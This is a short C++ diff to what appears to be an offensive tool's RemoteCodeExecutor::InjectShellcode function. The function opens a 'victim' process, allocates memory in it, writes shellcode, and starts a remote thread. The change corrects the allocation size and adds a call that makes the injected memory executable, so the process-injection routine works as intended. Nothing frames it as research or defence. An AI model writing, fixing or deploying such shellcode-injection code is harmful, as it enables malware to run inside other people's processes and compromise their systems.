@@ -60,9 +60,9 @@ void RemoteCodeExecutor::InjectShellcode(const uint8_t* shellcode,
     HANDLE hThread{ 0 };
     try {
         hVictim = OpenVictimProcess(GetProcessId(victim_proc_name));
-        SIZE_T bytes_needed = (shellcode_size + 1) * sizeof(wchar_t);
-        allocated_memory = AllocateMemoryInVictim(hVictim, NULL, bytes_needed);
-        WriteToVictimMemory(hVictim, allocated_memory, shellcode, bytes_needed);
+        allocated_memory = AllocateMemoryInVictim(hVictim, NULL, shellcode_size);
+        WriteToVictimMemory(hVictim, allocated_memory, shellcode, shellcode_size);
+        MakeVictimMemoryExecutable(hVictim, allocated_memory, shellcode_size);
         hThread = CreateThreadInVictim(hVictim, allocated_memory, NULL);
     }
     catch (const std::exception& e) {
